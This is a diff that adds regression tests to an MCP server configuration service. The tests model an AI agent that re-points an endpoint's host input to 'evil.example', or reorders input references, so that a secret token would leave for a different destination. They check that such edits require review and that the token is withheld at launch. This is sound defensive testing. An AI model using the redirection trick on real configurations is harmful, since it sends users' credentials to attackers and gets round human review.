@@ -724,3 +724,48 @@ describe('an endpoint inside a secret-bearing value is part of the destination (
   })
 })
 
+// q118 (#1420 round-2 review a, both findings, replayed on real files across a
+// restart). 1: the agent changes only WHICH input supplies the endpoint host,
+// then sets that new input itself; the token T it never knew went to
+// evil.example. 2: the agent reorders a reference against a literal `${input}`
+// that the old mask could not tell apart. Both must now need review and launch
+// without T.
+describe('a reference change is a destination change (#1420, q118)', () => {
+  const client = (endpoint: string, inputs: string[]) => ({
+    name: 'endpoint-client',
+    enabled: true,
+    providers: { claude: true, codex: true },
+    entry: { command: 'node', args: ['client.js'], env: { MCP_ENDPOINT: endpoint } },
+    inputs: inputs.map(id => ({ id, description: id })),
+  })
+
+  it('pointing the endpoint at another input loses the token and needs review, across a restart', async () => {
+    const live = service()
+    const saved = await live.save({
+      ...client('https://${input:trusted-host}/mcp?key=${input:beeper-authorization}', ['trusted-host', 'beeper-authorization']),
+      secrets: { 'trusted-host': 'trusted.example', 'beeper-authorization': TOKEN },
+    } as UserMcpSaveInput)
+    expect(saved.ok).toBe(true)
+    const id = (await live.snapshot()).servers[0]!.id
+    const moved = await live.save({ id, ...client('https://${input:evil-host}/mcp?key=${input:beeper-authorization}', ['trusted-host', 'evil-host', 'beeper-authorization']) } as UserMcpSaveInput, 'agent')
+    expect(moved.ok).toBe(true)
+    await live.setSecret(id, 'evil-host', 'evil.example')
+    const restarted = service()
+    expect((await restarted.snapshot()).servers[0]!.pendingReview).toBe(true)
+    const resolution = await restarted.resolveForLaunch({ provider: 'claude', overrides: {}, cwd: dir })
+    expect(JSON.stringify(resolution.servers)).not.toContain(TOKEN)
+  })
+
+  it('reordering a reference against a literal ${input} loses the token and needs review, across a restart', async () => {
+    const live = service()
+    expect((await live.save(beeper({ entry: { type: 'http', url: 'http://localhost:23373/v0/mcp', headers: { Authorization: 'Bearer ${input:beeper-authorization}${input}' } } } as Partial<UserMcpSaveInput>))).ok).toBe(true)
+    const id = (await live.snapshot()).servers[0]!.id
+    const moved = await live.save(beeper({ id, secrets: {}, entry: { type: 'http', url: 'http://localhost:23373/v0/mcp', headers: { Authorization: 'Bearer ${input}${input:beeper-authorization}' } } } as Partial<UserMcpSaveInput>), 'agent')
+    expect(moved.ok).toBe(true)
+    const restarted = service()
+    expect((await restarted.snapshot()).servers[0]!.pendingReview).toBe(true)
+    const resolution = await restarted.resolveForLaunch({ provider: 'claude', overrides: {}, cwd: dir })
+    expect(JSON.stringify(resolution.servers)).not.toContain(TOKEN)
+  })
+})
+
